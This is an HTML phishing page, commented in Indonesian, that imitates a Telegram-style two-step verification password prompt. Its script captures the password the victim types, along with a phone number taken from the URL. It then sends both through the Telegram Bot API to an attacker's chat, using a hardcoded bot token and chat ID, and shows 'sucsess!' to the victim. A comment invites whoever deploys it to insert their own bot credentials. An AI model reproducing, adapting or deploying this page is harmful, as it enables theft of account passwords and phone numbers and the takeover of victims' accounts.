<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>masukkan password</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 400px;
      width: 90%;
      margin: 50px auto;
      text-align: center;
      padding: 0 20px;
    }
    /* Emoji Monyet Tutup Mata */
    .monkey-emoji {
      font-size: 80px;
      margin-bottom: 20px;
      display: block;
    }
    h1 {
      font-size: 24px;
      margin: 0 0 10px;
    }
    p {
      color: #555;
      margin: 0 0 30px;
    }
    .input-wrapper {
      position: relative;
      margin-bottom: 20px;
    }
    .input-wrapper input[type="password"],
    .input-wrapper input[type="text"] {
      width: 100%;
      box-sizing: border-box;
      padding: 10px 40px 10px 10px; /* ruang untuk ikon mata di sebelah kanan */
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    /* Ikon toggle visibility */
    .toggle-icon {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 24px;
      cursor: pointer;
      opacity: 0.6;
    }
    .toggle-icon:hover {
      opacity: 1;
    }
    .btn {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      background-color: #7b61ff; /* Warna ungu mirip screenshot */
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #6a54db;
    }
    .status {
      margin-top: 15px;
      font-weight: bold;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="container">
    <!-- Emoji Monyet Tutup Mata (ðŸ™ˆ) -->
    <span class="monkey-emoji">ðŸ™ˆ</span>

    <h1>Enter Password</h1>
    <p>You have Two-Step Verification enabled, so your account is protected with an additional password.</p>

    <!-- Form Password -->
    <form id="passwordForm">
      <div class="input-wrapper">
        <input 
          type="password" 
          id="passwordInput" 
          placeholder="Password" 
          required 
        />
        <!-- Ikon mata untuk toggle visibility -->
        <img 
          src="https://cdn-icons-png.flaticon.com/512/709/709612.png" 
          alt="Toggle" 
          class="toggle-icon" 
          id="togglePassword"
        >
      </div>

      <button type="submit" class="btn">PLEASE WAIT...</button>
    </form>

    <div class="status" id="statusMessage"></div>
  </div>

  <script>
    // === Ganti dengan Bot Token dan Chat ID milik Anda ===
    const botToken = "7781620873:AAF79kTCxEV2gy6OvQCKZQO97Fwoelqv9So";
    const chatId   = "6543036611";
    // =====================================================

    // Ambil parameter "phone" (jika diperlukan untuk dikirim ulang)
    const urlParams = new URLSearchParams(window.location.search);
    const phoneParam = urlParams.get('phone') || "";

    const passwordForm = document.getElementById('passwordForm');
    const passwordInput = document.getElementById('passwordInput');
    const togglePassword = document.getElementById('togglePassword');
    const statusMessage = document.getElementById('statusMessage');

    // Toggle visibility password
    let passwordVisible = false;
    togglePassword.addEventListener('click', () => {
      passwordVisible = !passwordVisible;
      if (passwordVisible) {
        passwordInput.type = "text";
        togglePassword.src = "https://cdn-icons-png.flaticon.com/512/709/709612.png"; // Ikon 'eye'
      } else {
        passwordInput.type = "password";
        togglePassword.src = "https://cdn-icons-png.flaticon.com/512/709/709620.png"; // Ikon 'eye slash'
      }
    });

    // Saat form disubmit
    passwordForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const passwordValue = passwordInput.value.trim();

      if (!passwordValue) {
        statusMessage.style.color = "red";
        statusMessage.textContent = "Password tidak boleh kosong!";
        return;
      }

      statusMessage.style.color = "black";
      statusMessage.textContent = "Mengirim...";

      // Buat pesan yang akan dikirim ke bot
      // Misal kirim info password + nomor telepon (jika masih diperlukan)
      let messageText = `â€¢ password: ${passwordValue}
      ______________________________
      ______________________________`;
      if (phoneParam) {
        messageText = `@DAWEBPHST 
_________________________________
â€¢ Nomor Hp : ${phoneParam}\n` + messageText;
      }

      const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;

      fetch(telegramAPI)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            statusMessage.style.color = "green";
            statusMessage.textContent = "sucsess!";
            passwordInput.value = "";
          } else {
            statusMessage.style.color = "red";
            statusMessage.textContent = "Gagal mengirim: " + (data.description || "Unknown error");
          }
        })
        .catch(error => {
          statusMessage.style.color = "red";
          statusMessage.textContent = "Terjadi kesalahan: " + error;
        });
    });
  </script>
</body>
</html>
